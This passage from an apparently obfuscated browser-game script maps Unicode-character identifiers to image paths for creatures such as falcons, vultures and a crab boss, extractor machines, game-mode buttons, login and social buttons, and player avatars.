			"ΔᐃⲆⲆⵠⵠΔ": "img/day-wing-lava-right-tamed.png",
			"ⵠⵠⲆⵠΔΔⵠ": "img/night-wing-lava-right-tamed.png",
			"ᐃⵠᐃⲆⵠⵠⲆ": "img/day-wing-lava-left.png",
			"ⲆΔΔⵠⵠᐃᐃ": "img/night-wing-lava-left.png",
			"ⵠΔⲆⵠᐃᐃΔ": "img/day-wing-lava-right.png",
			"ΔΔᐃⲆᐃⵠΔ": "img/night-wing-lava-right.png",
			"ⵠⵠΔⵠΔΔᐃ": "img/hurt-baby-lava.png",
			"ⵠᐃⲆΔΔΔⵠ": "img/hurt-baby-lava-wing-left.png",
			"ⵠⲆᐃⵠⵠΔᐃ": "img/hurt-baby-lava-wing-right.png",
			"ΔΔⵠᐃᐃΔΔ": "img/inv-baby-lava-out.png",
			"ᐃⵠᐃⲆⲆᐃΔ": "img/inv-baby-lava-in.png",
			"ΔⲆΔⲆᐃⵠᐃ": "img/inv-baby-lava-click.png",
			"ⵠΔⲆⲆⲆΔⵠ": "img/day-falcon.png",
			"ⲆᐃⲆᐃⲆⲆᐃ": "img/night-falcon.png",
			"ᐃΔᐃⲆⵠⵠⲆ": "img/day-falcon-angry.png",
			"ⲆᐃΔΔⲆⵠΔ": "img/night-falcon-angry.png",
			"ⵠⲆⵠⵠⵠᐃΔ": "img/day-falcon-ground.png",
			"ΔⵠΔⲆΔⵠⵠ": "img/night-falcon-ground.png",
			"ⵠⵠⲆᐃⲆⵠΔ": "img/day-falcon-ground-angry.png",
			"ⲆⵠᐃⵠⵠΔΔ": "img/night-falcon-ground-angry.png",
			"ᐃⲆⵠᐃᐃⵠⵠ": "img/day-falcon-wings-left.png",
			"ΔΔᐃᐃΔΔᐃ": "img/night-falcon-wings-left.png",
			"ΔⲆⲆⵠⵠⲆᐃ": "img/day-falcon-wings-right.png",
			"ⲆᐃⵠⲆⵠᐃΔ": "img/night-falcon-wings-right.png",
			"ΔᐃΔᐃΔⲆᐃ": "img/day-falcon-angry-wings-left.png",
			"ΔⵠᐃΔⵠⵠᐃ": "img/night-falcon-angry-wings-left.png",
			"ΔΔᐃᐃᐃⲆⵠ": "img/day-falcon-angry-wings-right.png",
			"ΔⵠΔᐃⵠⵠⵠ": "img/night-falcon-angry-wings-right.png",
			"ⵠᐃΔᐃᐃⵠⵠ": "img/day-falcon-wings-left-tamed.png",
			"ΔⵠⲆⲆⵠⲆⵠ": "img/night-falcon-wings-left-tamed.png",
			"ᐃᐃΔᐃⲆᐃΔ": "img/day-falcon-wings-right-tamed.png",
			"ⵠᐃᐃⲆΔᐃⲆ": "img/night-falcon-wings-right-tamed.png",
			"ⵠⵠⵠⲆⵠⲆΔ": "img/day-falcon-tamed.png",
			"ΔⵠᐃΔⲆΔⲆ": "img/night-falcon-tamed.png",
			"ΔⵠΔⵠᐃⲆⲆ": "img/hurt-falcon-ground.png",
			"ⲆⲆⲆᐃΔᐃᐃ": "img/hurt-falcon.png",
			"ΔᐃΔᐃΔⵠᐃ": "img/hurt-falcon-wings-left.png",
			"ⵠᐃᐃΔⲆⵠΔ": "img/hurt-falcon-wings-right.png",
			"ΔΔⵠⵠΔΔⲆ": "img/inv-falcon-out.png",
			"ⲆⲆΔᐃᐃΔⵠ": "img/inv-falcon-in.png",
			"ΔⵠΔⲆΔⵠⲆ": "img/inv-falcon-click.png",
			"ⵠΔΔᐃⵠⲆⵠ": "img/day-crab-boss.png",
			"ⲆΔⵠᐃᐃᐃⵠ": "img/night-crab-boss.png",
			"ⵠⵠΔⲆⵠⲆᐃ": "img/day-crab-boss-angry.png",
			"ⲆᐃⵠΔᐃᐃΔ": "img/night-crab-boss-angry.png",
			"ΔᐃⲆⵠΔᐃᐃ": "img/day-crab-boss-tamed.png",
			"ᐃⵠⲆᐃΔΔΔ": "img/night-crab-boss-tamed.png",
			"ⵠᐃⲆᐃⵠᐃᐃ": "img/day-crab-boss-claw-left-attack.png",
			"ⲆⲆⵠᐃΔⲆᐃ": "img/night-crab-boss-claw-left-attack.png",
			"ᐃⵠⵠᐃⲆⲆᐃ": "img/day-crab-boss-claw-right-attack.png",
			"ΔΔΔᐃⲆᐃΔ": "img/night-crab-boss-claw-right-attack.png",
			"ΔⲆⲆⲆⵠΔⲆᐃΔ": "img/day-crab-boss-claw-left-tamed.png",
			"ⲆⲆΔⵠⲆᐃΔⲆΔ": "img/night-crab-boss-claw-left-tamed.png",
			"ᐃⵠⲆⲆⲆⵠⲆⵠΔ": "img/day-crab-boss-claw-right-tamed.png",
			"ᐃᐃᐃΔᐃᐃⵠⲆᐃ": "img/night-crab-boss-claw-right-tamed.png",
			"ΔΔᐃⲆᐃΔΔ": "img/day-crab-boss-claw-left.png",
			"ⲆΔⲆⵠⲆΔᐃ": "img/night-crab-boss-claw-left.png",
			"ΔΔΔᐃⲆᐃⵠ": "img/day-crab-boss-claw-right.png",
			"ⵠᐃⲆⲆΔⲆⲆ": "img/night-crab-boss-claw-right.png",
			"ΔⲆΔⲆⵠᐃⵠ": "img/hurt-crab-boss.png",
			"ⵠⲆⲆⵠᐃⲆᐃ": "img/hurt-crab-boss-claw-left.png",
			"ⲆᐃΔⲆⲆⵠΔ": "img/hurt-crab-boss-claw-right.png",
			"ⲆⲆⲆᐃΔⵠᐃ": "img/heal-crab-boss.png",
			"ΔⲆΔᐃΔⲆⲆ": "img/heal-crab-boss-claw-left.png",
			"ⲆᐃᐃΔⵠΔⵠ": "img/heal-crab-boss-claw-right.png",
			"ΔⲆⲆΔᐃᐃᐃ": "img/crab-step.png",
			"ΔΔΔΔⵠⲆⲆ": "img/inv-crab-boss-out.png",
			"ᐃⵠΔⲆΔΔⵠ": "img/inv-crab-boss-in.png",
			"ᐃᐃⵠⵠΔΔᐃ": "img/inv-crab-boss-click.png",
			"ᐃᐃⲆⵠᐃⵠⵠ": "img/day-cactus10.png",
			"ᐃᐃⲆⵠⵠⲆⵠ": "img/night-cactus10.png",
			"ΔⵠΔⵠⲆⲆᐃ": "img/inv-cactus-out.png",
			"ΔΔⲆΔⵠᐃⲆ": "img/inv-cactus-in.png",
			"ᐃⵠᐃᐃᐃⲆⵠ": "img/inv-cactus-click.png",
			"ᐃⲆⵠΔᐃᐃⲆ": "img/day-scorpion.png",
			"ΔᐃΔᐃᐃⵠᐃ": "img/night-scorpion.png",
			"ⲆⲆⲆΔⲆΔΔ": "img/day-scorpion-hand-left.png",
			"ⲆⵠⲆΔⲆΔⵠ": "img/night-scorpion-hand-left.png",
			"ⲆⵠⲆⵠΔⲆⵠ": "img/day-scorpion-hand-right.png",
			"ⵠΔⲆΔᐃΔᐃ": "img/night-scorpion-hand-right.png",
			"ᐃΔⲆΔⲆΔⵠ": "img/hurt-scorpion.png",
			"ⲆⵠᐃⵠⲆᐃⵠ": "img/hurt-scorpion-hand-left.png",
			"ᐃᐃΔⲆⵠᐃΔ": "img/hurt-scorpion-hand-right.png",
			"ᐃᐃΔⵠΔⵠᐃ": "img/day-vulture.png",
			"ᐃⲆΔΔⲆᐃⵠ": "img/night-vulture.png",
			"ΔΔⵠⵠⲆᐃⵠ": "img/day-vulture-angry.png",
			"ⵠⲆΔⵠⲆⲆᐃ": "img/night-vulture-angry.png",
			"ᐃⵠᐃΔⲆᐃⵠ": "img/day-vulture-ground.png",
			"ΔⵠᐃᐃᐃΔᐃ": "img/night-vulture-ground.png",
			"ΔᐃᐃⲆⲆΔⵠ": "img/day-vulture-ground-angry.png",
			"ⵠⲆΔΔⵠᐃⲆ": "img/night-vulture-ground-angry.png",
			"ⵠⵠΔᐃⲆⲆᐃ": "img/day-vulture-wings-left.png",
			"ⲆᐃⲆⵠⲆⲆⲆ": "img/night-vulture-wings-left.png",
			"ΔⵠᐃΔᐃᐃⵠ": "img/day-vulture-wings-right.png",
			"Δⵠᐃᐃᐃⵠᐃ": "img/night-vulture-wings-right.png",
			"ⵠⵠΔⵠⲆⲆᐃ": "img/day-vulture-angry-wings-left.png",
			"ⵠΔᐃⵠᐃⲆⲆ": "img/night-vulture-angry-wings-left.png",
			"ⵠⵠᐃΔⵠⵠⵠ": "img/day-vulture-angry-wings-right.png",
			"ⲆΔⵠᐃᐃⲆΔ": "img/night-vulture-angry-wings-right.png",
			"ΔⲆΔΔΔⲆΔ": "img/day-vulture-wings-left-tamed.png",
			"ᐃⵠⵠⲆⲆΔΔ": "img/night-vulture-wings-left-tamed.png",
			"ⲆᐃⲆᐃΔⲆΔ": "img/day-vulture-wings-right-tamed.png",
			"ⵠᐃΔⵠΔⲆⵠ": "img/night-vulture-wings-right-tamed.png",
			"ⵠΔⵠⵠⵠᐃⵠ": "img/day-vulture-tamed.png",
			"ΔⵠᐃᐃᐃΔΔ": "img/night-vulture-tamed.png",
			"ᐃⵠⲆⵠΔᐃⲆ": "img/hurt-vulture-ground.png",
			"ⲆᐃⵠΔⵠᐃⵠ": "img/hurt-vulture.png",
			"ΔΔΔΔⵠᐃᐃ": "img/hurt-vulture-wings-left.png",
			"ᐃⵠΔᐃᐃⲆΔ": "img/hurt-vulture-wings-right.png",
			"ⵠΔⲆᐃⲆⲆΔ": "img/day-aloe-vera.png",
			"ΔⵠⵠΔΔⲆᐃ": "img/night-aloe-vera.png",
			"ᐃᐃΔΔΔⲆΔ": "img/inv-aloe-vera-out.png",
			"ⵠⵠⲆᐃⲆⲆᐃ": "img/inv-aloe-vera-in.png",
			"ⵠΔⲆⲆⵠΔΔ": "img/inv-aloe-vera-click.png",
			"ⵠᐃⵠᐃⵠⵠⲆ": "img/day-aloe-vera-grown.png",
			"ⲆᐃΔⲆⵠⲆᐃ": "img/night-aloe-vera-grown.png",
			"ⵠᐃᐃⲆᐃⲆΔ": "img/day-aloe-vera-dried.png",
			"ⵠᐃᐃᐃᐃᐃⲆ": "img/night-aloe-vera-dried.png",
			"ⲆⵠⲆᐃⲆⵠⲆ": "img/day-turban1.png",
			"ᐃᐃΔΔΔⵠΔ": "img/night-turban1.png",
			"ⵠⵠΔⲆⲆⲆⵠ": "img/day-turban2.png",
			"ⲆΔⵠᐃᐃΔⵠ": "img/night-turban2.png",
			"ᐃⵠΔⲆΔᐃⲆ": "img/inv-turban2-out.png",
			"ΔᐃⲆᐃⲆᐃᐃ": "img/inv-turban2-in.png",
			"ⲆⵠⵠᐃⵠΔⲆ": "img/inv-turban2-click.png",
			"ⲆΔΔⵠⲆᐃⲆ": "img/inv-turban1-out.png",
			"ⲆⲆⵠᐃΔⵠⵠ": "img/inv-turban1-in.png",
			"ⵠⵠⲆΔᐃΔⵠ": "img/inv-turban1-click.png",
			"ⲆᐃⵠᐃΔᐃⵠ": "img/day-pitchfork2.png",
			"ΔᐃⵠΔᐃᐃᐃ": "img/night-pitchfork2.png",
			"ⲆⵠᐃᐃΔⵠΔ": "img/inv-pitchfork2-out.png",
			"ⲆⵠΔΔⲆᐃᐃ": "img/inv-pitchfork2-in.png",
			"ⲆΔⵠⵠⵠⵠⵠ": "img/inv-pitchfork2-click.png",
			"ⵠⲆⲆⵠᐃᐃᐃ": "img/inv-gold-fork-click.png",
			"ΔⵠΔⲆΔᐃⲆ": "img/inv-pilot-glasses-click.png",
			"ⲆⲆΔΔΔⲆⵠ": "img/day-pilot-helmet.png",
			"ⲆⲆⲆⲆΔⵠⵠ": "img/night-pilot-helmet.png",
			"ⲆⲆᐃⵠⲆᐃΔ": "img/inv-pilot-helmet-out.png",
			"ⲆᐃⲆᐃΔᐃⲆ": "img/inv-pilot-helmet-in.png",
			"Ⲇⵠⵠᐃⵠᐃⵠ": "img/inv-pilot-helmet-click.png",
			"ⵠΔΔⲆΔᐃΔᐃᐃ": "img/day-sandworm0.png",
			"ΔⲆΔⵠⲆᐃⲆ": "img/day-sandworm1.png",
			"ᐃΔᐃΔᐃᐃΔ": "img/day-sandworm2.png",
			"ⵠΔᐃΔΔⵠᐃΔⵠ": "img/night-sandworm0.png",
			"ⵠⵠΔⵠⲆᐃⵠ": "img/night-sandworm1.png",
			"ᐃᐃⵠⲆⲆΔⵠ": "img/night-sandworm2.png",
			"ᐃⵠᐃⲆΔⲆⲆ": "img/hurt-sandworm0.png",
			"ⵠᐃᐃⲆᐃΔⲆ": "img/hurt-sandworm1.png",
			"ᐃΔΔᐃΔⲆⲆ": "img/hurt-sandworm2.png",
			"ⲆᐃⲆⵠΔ": "img/inv-vulture-feather-click.png",
			"ⵠᐃⵠᐃΔᐃΔ": "img/day-emerald0.png",
			"ⲆⵠΔᐃⵠΔⵠ": "img/night-emerald0.png",
			"ᐃΔⲆᐃⵠⲆΔ": "img/day-emerald1.png",
			"ᐃⲆⲆᐃⵠⲆᐃ": "img/night-emerald1.png",
			"ᐃⵠⲆΔⵠⵠⵠ": "img/day-emerald2.png",
			"ᐃᐃⵠᐃⲆⵠᐃ": "img/night-emerald2.png",
			"ⲆᐃᐃⵠΔ": "img/inv-emerald-click.png",
			"ΔᐃΔⲆΔⲆⵠ": "img/inv-sworm-juice-out.png",
			"ᐃⲆⲆⵠⵠΔᐃ": "img/inv-sworm-juice-in.png",
			"ⲆⵠⵠⵠᐃᐃⲆ": "img/inv-sworm-juice-click.png",
			"ΔᐃᐃⲆᐃᐃⵠ": "img/day-point-machine.png",
			"ⵠΔΔΔΔᐃⵠ": "img/night-point-machine.png",
			"ⲆⲆⵠΔⵠⲆⲆ": "img/day-point-machine-hole.png",
			"ⵠⵠΔΔⵠᐃᐃ": "img/night-point-machine-hole.png",
			"ⵠⲆⲆⲆⵠⲆΔ": "img/day-point-machine-ground.png",
			"ᐃⵠⲆⵠⲆⲆΔ": "img/night-point-machine-ground.png",
			"ⲆΔᐃΔⵠⲆᐃ": "img/day-point-machine-rotate.png",
			"Ⲇᐃᐃᐃᐃⵠⵠ": "img/night-point-machine-rotate.png",
			"ⲆᐃⲆⵠⲆⵠΔ": "img/inv-point-machine-out.png",
			"ⲆⵠⲆⲆⲆⵠⵠ": "img/inv-point-machine-in.png",
			"ᐃΔⵠⲆⵠᐃᐃ": "img/inv-point-machine-click.png",
			"ΔⲆΔⲆΔⲆⵠ": "img/day-extractor-machine0-stone.png",
			"ΔⲆⲆⵠⲆᐃⵠ": "img/night-extractor-machine0-stone.png",
			"ᐃⲆⲆΔⲆⲆⲆ": "img/day-extractor-machine-stone.png",
			"ΔΔⵠⵠΔⲆⲆ": "img/night-extractor-machine-stone.png",
			"ⲆᐃΔⵠᐃⵠⲆ": "img/inv-extractor-machine-stone-out.png",
			"ᐃᐃΔᐃⲆⲆᐃ": "img/inv-extractor-machine-stone-in.png",
			"ΔΔⵠⲆᐃᐃⲆ": "img/inv-extractor-machine-stone-click.png",
			"ᐃⲆΔΔᐃⵠᐃ": "img/day-extractor-machine0-gold.png",
			"ΔᐃⲆΔⲆⲆⵠ": "img/night-extractor-machine0-gold.png",
			"ᐃᐃⵠⵠⵠΔⵠ": "img/day-extractor-machine-gold.png",
			"ΔΔⵠⵠⵠΔᐃ": "img/night-extractor-machine-gold.png",
			"ⵠᐃᐃⲆⵠⵠⵠ": "img/inv-extractor-machine-gold-out.png",
			"ⲆⲆᐃΔⲆⵠⲆ": "img/inv-extractor-machine-gold-in.png",
			"ⵠⲆΔⵠᐃⲆⲆ": "img/inv-extractor-machine-gold-click.png",
			"ΔⵠΔⲆⵠᐃΔ": "img/day-extractor-machine0-diamond.png",
			"ⲆⲆᐃΔⲆᐃᐃ": "img/night-extractor-machine0-diamond.png",
			"ⲆⵠᐃⲆᐃⲆΔ": "img/day-extractor-machine-diamond.png",
			"ⵠⵠΔᐃᐃⲆΔ": "img/night-extractor-machine-diamond.png",
			"ΔⵠⲆⲆᐃⲆⵠ": "img/inv-extractor-machine-diamond-out.png",
			"ⵠⲆⵠⲆⵠᐃΔ": "img/inv-extractor-machine-diamond-in.png",
			"ΔⲆⲆΔᐃⵠⲆ": "img/inv-extractor-machine-diamond-click.png",
			"ⵠⵠᐃⵠⲆⵠΔ": "img/day-extractor-machine0-amethyst.png",
			"ⵠⲆⵠⲆΔΔᐃ": "img/night-extractor-machine0-amethyst.png",
			"ᐃᐃᐃΔⲆⵠᐃ": "img/day-extractor-machine-amethyst.png",
			"ΔΔⵠᐃⵠⲆⵠ": "img/night-extractor-machine-amethyst.png",
			"ⵠᐃⲆⲆᐃⲆⵠ": "img/inv-extractor-machine-amethyst-out.png",
			"ⲆⲆⲆΔⲆⲆᐃ": "img/inv-extractor-machine-amethyst-in.png",
			"ⲆᐃᐃᐃⲆΔⲆ": "img/inv-extractor-machine-amethyst-click.png",
			"ⲆⵠΔⵠΔᐃⲆ": "img/day-extractor-machine0-reidite.png",
			"ᐃⲆΔΔⲆᐃΔ": "img/night-extractor-machine0-reidite.png",
			"ᐃΔᐃᐃⲆᐃⲆ": "img/day-extractor-machine-reidite.png",
			"ⲆΔⲆⲆᐃⲆⲆ": "img/night-extractor-machine-reidite.png",
			"ⵠᐃΔᐃⲆᐃΔ": "img/inv-extractor-machine-reidite-out.png",
			"ⵠᐃΔᐃⲆΔᐃ": "img/inv-extractor-machine-reidite-in.png",
			"ⲆⲆⲆⲆᐃⲆⲆ": "img/inv-extractor-machine-reidite-click.png",
			"ⲆᐃⲆⲆⲆΔⲆ": "img/extractor-cases.png",
			"Ⲇᐃⵠⵠᐃᐃᐃ": "img/day-golden-hen.png",
			"ⵠⵠⵠΔᐃᐃⵠ": "img/night-golden-hen.png",
			"ⲆⲆΔⲆⵠⵠΔ": "img/day-golden-chicken.png",
			"ⲆᐃΔⲆᐃⲆⵠ": "img/night-golden-chicken.png",
			"ΔⲆⲆΔΔᐃⲆ": "img/hurt-golden-hen.png",
			"ΔΔᐃⵠⲆᐃⵠ": "img/hurt-golden-chicken.png",
			"ⲆᐃⵠᐃⲆᐃⲆ": "img/logo-interface.png",
			"ⲆᐃⵠΔⲆⲆΔ": "img/forest-mode-hover.png",
			"ΔᐃᐃΔⲆⵠⲆ": "img/normal-mode-hover.png",
			"ⲆⵠⲆΔᐃᐃⲆ": "img/vampire-mode-hover.png",
			"ᐃⲆᐃⲆᐃᐃⵠ": "img/zombie-mode-hover.png",
			"ⲆΔΔⵠⵠⵠⵠ": "img/community-mode-hover2.png",
			"ⲆΔΔⲆΔΔΔ": "img/experimental-mode-hover.png",
			"ᐃⵠᐃᐃⲆⵠᐃ": "img/zombie-mode-out.png",
			"ⲆⲆⵠⵠᐃΔⲆ": "img/zombie-mode-in.png",
			"ⲆⵠΔΔⲆⲆⲆ": "img/zombie-mode-click.png",
			"ⵠⵠΔᐃⵠⲆⵠ": "img/vampire-mode-out.png",
			"ᐃᐃᐃΔⲆΔⲆ": "img/vampire-mode-in.png",
			"ΔᐃᐃᐃΔⵠΔ": "img/vampire-mode-click.png",
			"ⵠⲆᐃⵠⲆⲆⲆ": "img/normal-mode-out.png",
			"ΔᐃⲆⵠⵠΔᐃ": "img/normal-mode-in.png",
			"ᐃΔΔⲆⲆⵠⵠ": "img/normal-mode-click.png",
			"ⲆⵠΔⲆΔᐃⲆ": "img/forest-mode-out.png",
			"ᐃⲆΔⲆΔᐃⲆ": "img/forest-mode-in.png",
			"ⵠⲆΔⵠⵠⲆΔ": "img/forest-mode-click.png",
			"Δⵠⵠᐃᐃᐃᐃ": "img/community-mode-out.png",
			"ⲆᐃΔΔⵠΔΔ": "img/community-mode-in.png",
			"ΔⲆᐃᐃⵠⵠⲆ": "img/community-mode-click.png",
			"ⵠⲆΔⵠⲆᐃⲆ": "img/experimental-modes-out.png",
			"ΔᐃⵠᐃⵠⲆΔ": "img/experimental-modes-in.png",
			"ΔΔᐃⵠⲆΔΔ": "img/experimental-modes-click.png",
			"ⲆᐃΔⵠⵠⲆΔ": "img/youtube-button-out.png",
			"ᐃᐃΔᐃⲆⵠΔ": "img/youtube-button-in.png",
			"ⵠⵠⵠᐃⲆᐃᐃ": "img/youtube-button-click.png",
			"ᐃᐃⵠᐃΔᐃΔ": "img/wiki-button-out.png",
			"ΔⲆΔΔⵠⲆΔ": "img/wiki-button-in.png",
			"ᐃᐃᐃⵠΔΔⵠ": "img/wiki-button-click.png",
			"ᐃⲆΔⲆⵠΔᐃ": "img/twitter-button-out.png",
			"ⲆⲆΔⵠᐃⵠⲆ": "img/twitter-button-in.png",
			"ⵠⲆΔⵠᐃΔᐃ": "img/twitter-button-click.png",
			"ΔⲆⲆⵠⵠᐃΔ": "img/facebook-button-out.png",
			"ΔⵠΔΔⵠΔᐃ": "img/facebook-button-in.png",
			"ΔⵠᐃΔΔΔⲆ": "img/facebook-button-click.png",
			"ⵠᐃⵠⲆᐃⵠᐃ": "img/reddit-button-out.png",
			"ᐃⲆΔⲆⲆᐃᐃ": "img/reddit-button-in.png",
			"ⲆΔᐃⲆⵠⵠⵠ": "img/reddit-button-click.png",
			"ᐃΔⲆᐃⲆᐃⵠ": "img/discord-button-out.png",
			"ⲆΔⲆΔΔᐃⵠ": "img/discord-button-in.png",
			"ᐃⲆⲆⲆᐃΔⵠ": "img/discord-button-click.png",
			"ᐃᐃᐃΔⲆΔΔ": "img/merch-button-out.png",
			"ᐃᐃⲆⵠΔⵠⵠ": "img/merch-button-in.png",
			"ΔΔⲆⵠⲆⲆⲆ": "img/merch-button-click.png",
			"ⵠΔⵠΔⲆΔᐃΔⵠ": "img/terminal-button-out.png",
			"ⵠⲆΔΔⵠⵠΔⲆⵠ": "img/terminal-button-in.png",
			"ᐃᐃΔⲆΔΔⲆⲆΔ": "img/terminal-button-click.png",
			"ⵠⵠⵠⵠᐃΔⲆ": "img/restart-out.png",
			"ⲆⵠⲆⲆⵠⵠⲆ": "img/restart-in.png",
			"ⵠΔᐃⲆΔᐃⲆ": "img/restart-click.png",
			"ᐃΔᐃΔᐃΔⵠ": "img/reboot-out.png",
			"ᐃⵠⵠⵠᐃⲆΔ": "img/reboot-in.png",
			"ΔⵠΔⵠⵠᐃᐃ": "img/reboot-click.png",
			"ⵠⵠⲆᐃⵠⵠⵠ": "img/guide-out.png",
			"ⵠⲆΔⵠᐃΔⵠ": "img/guide-in.png",
			"ΔⵠⲆⲆⲆᐃⵠ": "img/guide-click.png",
			"ⲆⲆΔΔᐃΔⵠ": "img/copy-paste-out.png",
			"ⵠᐃΔⲆᐃⲆⲆ": "img/copy-paste-in.png",
			"ᐃΔΔⵠΔΔⲆ": "img/copy-paste-click.png",
			"ⵠΔΔⲆᐃΔⲆ": "img/link-buttons-bg.png",
			"ⵠⲆᐃᐃᐃⵠⲆ": "img/changelog-box2.png",
			"ⲆᐃⵠΔⵠⵠⲆ": "img/changelog_31.png",
			"ᐃᐃⵠⵠᐃⵠⲆ": "img/banner-taming.png",
			"ΔⵠⵠⵠⲆⵠⲆ": "img/profile-button-out.png",
			"ᐃⵠΔΔΔᐃⲆ": "img/profile-button-in.png",
			"ⵠΔΔⵠᐃⵠⲆ": "img/profile-button-click.png",
			"ᐃΔᐃᐃⲆⵠⲆ": "img/login-button-out.png",
			"ΔⲆⵠⲆᐃⵠΔ": "img/login-button-in.png",
			"ⵠᐃΔΔⵠᐃⲆ": "img/login-button-click.png",
			"ⵠⵠⲆⵠΔⵠⲆ": "img/login-google-out.png",
			"ⲆᐃᐃⵠΔⵠⵠ": "img/login-google-in.png",
			"ΔᐃᐃⵠⲆᐃᐃ": "img/login-google-click.png",
			"ᐃΔⲆΔΔᐃᐃ": "img/login-facebook-out.png",
			"ᐃΔᐃⲆΔΔΔ": "img/login-facebook-in.png",
			"ⲆⲆⵠⲆⲆⲆΔ": "img/login-facebook-click.png",
			"ⵠΔᐃΔⵠⵠⲆ": "img/account-box.png",
			"ΔΔᐃⵠᐃΔⲆⵠⲆ": "img/account-under-maintenance.png",
			"ᐃⲆⵠⲆⵠⵠΔ": "img/close-button-account-out.png",
			"ⲆᐃᐃⲆⵠⵠᐃ": "img/close-button-account-in.png",
			"ⲆⲆⵠΔⵠⵠΔ": "img/close-button-account-click.png",
			"ⲆⲆⲆⲆᐃᐃⲆ": "img/play-button-out.png",
			"ⲆΔⲆᐃⲆⲆᐃ": "img/play-button-in.png",
			"ᐃⲆⲆⵠᐃⲆⲆ": "img/play-button-click.png",
			"ⵠⵠⵠⵠᐃⲆᐃΔΔ": "img/app-store-badge.png",
			"ⵠⵠⵠⲆⵠⵠΔⵠΔ": "img/play-store-badge.png",
			"ᐃⲆΔᐃⲆᐃⲆΔⵠ": "img/mobile-boxad.png",
			"ᐃⲆΔᐃᐃΔⵠ": "img/modify-name-out.png",
			"ⵠᐃⵠⵠⲆΔᐃ": "img/modify-name-in.png",
			"ⲆⲆᐃᐃⲆⵠΔ": "img/modify-name-click.png",
			"ⵠⵠᐃⵠⲆΔᐃ": "img/copy-id-button-out.png",
			"ⲆᐃᐃΔΔΔⵠ": "img/copy-id-button-hover.png",
			"ᐃᐃΔⲆᐃᐃⵠ": "img/copy-id-button-active.png",
			"ᐃΔⲆⲆⲆΔᐃ": "img/yes-button-out.png",
			"ΔΔᐃⲆᐃⵠᐃ": "img/yes-button-in.png",
			"ⵠⲆΔᐃΔⵠᐃ": "img/yes-button-click.png",
			"ᐃⵠᐃⲆⲆⲆᐃ": "img/yes-300-button-out.png",
			"ⵠⲆΔⵠΔᐃᐃ": "img/yes-300-button-in.png",
			"ᐃΔΔⲆⵠⲆⲆ": "img/yes-300-button-click.png",
			"ΔⲆᐃΔⲆⲆᐃ": "img/no-button-out.png",
			"ⲆⵠⲆᐃⵠΔᐃ": "img/no-button-in.png",
			"ⵠⲆⵠᐃᐃⵠΔ": "img/no-button-click.png",
			"ᐃⵠⵠΔᐃⲆᐃ": "img/no-thanks-button-out.png",
			"ⲆΔΔⲆⲆΔⵠ": "img/no-thanks-button-in.png",
			"ⵠⲆᐃΔΔⵠᐃ": "img/no-thanks-button-click.png",
			"ⵠᐃΔⲆᐃᐃΔ": "img/shop-button-out.png",
			"ΔⲆᐃⲆΔᐃⵠ": "img/shop-button-in.png",
			"ᐃᐃⲆⵠⲆⵠΔ": "img/shop-button-click.png",
			"ⵠⲆᐃⵠΔᐃⲆ": "img/logout-out.png",
			"ᐃⵠΔΔⵠΔⲆ": "img/logout-in.png",
			"ⲆᐃᐃⵠΔⲆᐃ": "img/logout-click.png",
			"ⵠⵠᐃΔΔⵠᐃ": "img/terms-button-out.png",
			"ΔⵠⲆⵠΔᐃΔ": "img/terms-button-in.png",
			"ⲆⲆⵠⵠⲆᐃΔ": "img/terms-button-click.png",
			"ΔⲆᐃᐃΔΔⵠ": "img/tutorial-icon.png",
			"ΔΔΔᐃⲆⵠᐃ": "img/skins-icon.png",
			"ᐃᐃΔᐃᐃᐃⲆ": "img/shop-icon.png",
			"ΔᐃᐃᐃᐃⲆΔⵠᐃ": "img/paint-icon.png",
			"ΔᐃⲆΔⵠⲆⲆ": "img/leaderboard-icon.png",
			"ⵠᐃᐃΔᐃᐃΔ": "img/start-icon.png",
			"ᐃΔⵠᐃⲆⲆⵠ": "img/profile-icon.png",
			"Δⵠⵠᐃⵠⵠᐃ": "img/server-access-icon2.png",
			"ⵠⲆⲆᐃᐃⵠⵠ": "img/button-homepage-bg-out.png",
			"Δᐃᐃᐃᐃᐃⵠ": "img/button-homepage-bg-in.png",
			"ⵠᐃᐃⲆΔᐃᐃ": "img/button-homepage-bg-click.png",
			"ᐃⵠᐃⲆⲆΔⲆ": "img/button-bottom-homepage-bg-out.png",
			"ᐃⵠⲆⲆⲆⵠⲆ": "img/button-bottom-homepage-bg-in.png",
			"ⲆᐃⲆⵠⲆΔΔ": "img/button-bottom-homepage-bg-click.png",
			"ᐃΔⵠΔⲆⲆᐃ": "img/lvl-player.png",
			"ⲆⲆΔⵠⵠᐃⵠ": "img/avatar-player.png",
			"ΔᐃΔΔⲆⵠᐃ": "img/avatar-player1.png",
			"ΔΔⵠⵠⲆⵠᐃ": "img/avatar-player2.png",
			"ⲆΔᐃΔⲆᐃΔ": "img/avatar-player3.png",
			"ⲆΔⲆΔⵠᐃⲆ": "img/avatar-player4.png",
			"ⵠⵠⲆΔΔⲆΔ": "img/avatar-player5.png",
			"ᐃᐃⲆⵠᐃΔᐃ": "img/avatar-player6.png",
			"ᐃᐃⵠΔᐃⲆⵠ": "img/avatar-player7.png",
			"ⲆΔⵠΔᐃⲆᐃ": "img/avatar-player8.png",
			"ΔΔΔⲆᐃΔⵠ": "img/avatar-player9.png",
			"ᐃᐃΔᐃΔᐃᐃ": "img/avatar-player10.png",
			"ᐃⵠΔⵠΔⵠⲆ": "img/avatar-player11.png",
			"ᐃᐃⲆⵠΔΔⵠ": "img/avatar-player12.png",
			"ΔⲆⵠΔΔⵠⲆ": "img/avatar-player13.png",
			"ⵠΔⵠⲆⵠᐃⵠ": ⵠ[243],
			"ΔⲆΔⵠⵠᐃⲆ": ⵠ[243],
			"ᐃⲆⲆⵠⵠⵠᐃ": ⵠ[243],
			"ᐃΔⲆᐃᐃΔⵠ": ⵠ[243],
			"ⲆΔⵠΔᐃᐃⲆΔⲆ": "img/golden-bread.png",
			"ⲆᐃⲆΔⲆⲆⵠ": "img/buy-bread-out.png",
			"ⵠᐃᐃⵠⵠⲆⲆ": "img/buy-bread-in.png",
			"ⵠᐃⵠΔΔⵠⵠ": "img/buy-bread-click.png",
			"ⵠΔᐃⲆᐃΔⲆ": "img/gauge.png",
			"ⵠΔᐃΔΔΔⲆⲆΔ": "img/season-4-out.png",
			"ᐃᐃⵠⲆⲆⲆⵠⵠΔ": "img/season-4-in.png",
			"ⵠⲆᐃᐃΔΔΔⲆⵠ": "img/season-4-click.png",
			"ᐃΔⵠⵠⲆᐃΔⵠΔ": "img/season4-box.png",
			"ⲆⲆΔⵠⲆⵠΔⲆⵠ": "img/season-5-out.png",
			"ΔⲆⲆᐃⲆⲆᐃⲆΔ": "img/season-5-in.png",
